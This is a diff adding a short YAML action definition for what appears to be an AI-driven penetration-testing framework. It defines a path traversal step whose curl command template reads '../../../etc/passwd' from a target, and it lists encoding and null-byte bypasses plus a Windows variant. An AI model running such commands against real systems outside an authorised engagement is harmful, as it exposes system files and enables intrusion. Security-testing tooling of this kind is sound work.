@@ -1,0 +1,16 @@
+name: path_traversal
+category: web
+description: Path traversal / directory traversal
+preconditions:
+  - service.port==80
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "curl -s '{target_url}?file=../../../etc/passwd'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Traverse directory structure to read files outside web root. Bypasses: URL encoding (%2e%2e%2f), double encoding, null byte (%00), Unicode (..%c0%af). Windows: ..\..\windows\win.ini."
